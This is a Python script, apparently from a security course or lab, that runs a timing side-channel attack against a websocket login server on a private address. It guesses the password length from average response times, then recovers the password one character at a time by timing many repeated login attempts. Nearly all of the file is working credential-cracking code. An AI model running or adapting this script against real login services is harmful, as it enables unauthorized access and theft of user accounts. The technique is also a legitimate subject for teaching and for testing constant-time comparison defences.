import asyncio
import websockets
import json
import time
from statistics import median


async def client_stub(username, password):
    server_address = "ws://192.168.1.10:3840"
    err_count = 0
    while True:
        try:
            time_before = time.perf_counter()
            async with websockets.connect(server_address) as websocket:
                await websocket.send(json.dumps([username, password]))
                reply = await websocket.recv()
            time_after = time.perf_counter()
            time_delta = time_after - time_before
            if err_count != 0:
                print(err_count)
                err_count = 0
            return json.loads(reply), time_delta
        except:
            err_count += 1
            continue

# async def guess_length():
#     passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]

#     max_average_time = 0
#     guessed_length = 0

#     for password in passwords:
#         total_time = 0
#         num_attempts = 20

#         for a in range(num_attempts):
#             time.sleep(0.001)
#             info = await client_stub("000000", password)
#             total_time += info[1]
#             print("Elapsed total time:", total_time, "seconds")

#         average_time = total_time / num_attempts
#         print("Average time for password '{}': {}".format(password, average_time))

#         if average_time > max_average_time:
#             max_average_time = average_time
#             guessed_length = len(password)

#     print("Guessed password length:", guessed_length)
#     return guessed_length
    
    

async def guess_password(username):
    passwords = ["a", "aa", "aaa", "aaaa", "aaaaa", "aaaaaa", "aaaaaaa", "aaaaaaaa"]

    max_average_time = 0
    guessed_length = 0

    for password in passwords:
        total_time = 0
        num_attempts = 20

        for a in range(num_attempts):
            time.sleep(0.001)
            info = await client_stub("000000", password)
            total_time += info[1]
            print("Elapsed total time:", total_time, "seconds")

        average_time = total_time / num_attempts
        print("Average time for password '{}': {}".format(password, average_time))

        if average_time > max_average_time:
            max_average_time = average_time
            guessed_length = len(password)

    print("Guessed password length:", guessed_length)

    password_length = guessed_length
    password = ""
    while len(password) < password_length:
        response_averages = []
        for char in "abcdefghijklmnopqrstuvwxyz0123456789":
            response_times = []
            for _ in range(100):  # Probeer elk karakter 7 keer
                guess = password + char
                _, response_time = await client_stub(username, guess)
                response_times.append(response_time)
                print(f"Guessing '{guess}' -> Response time: {response_time}")
            average_time = sum(response_times) / len(response_times)
            response_averages.append(average_time)
            print(f"Average response time for character '{char}': {average_time}")
        max_average_time = max(response_averages)
        next_char_index = response_averages.index(max_average_time)
        next_char = "abcdefghijklmnopqrstuvwxyz0123456789"[next_char_index]
        print(f"Next character to try: '{next_char}'")
        password += next_char
        print(f"Password so far: {password}")
    return password


async def main():
    username = "454174"  # Assuming this is your username
    password = await guess_password(username)
    print("The password is:", password)

asyncio.run(main())
# async def main():
#     guessed_length = await guess_length()
#     print("Guessed password length:", guessed_length)

# asyncio.run(main())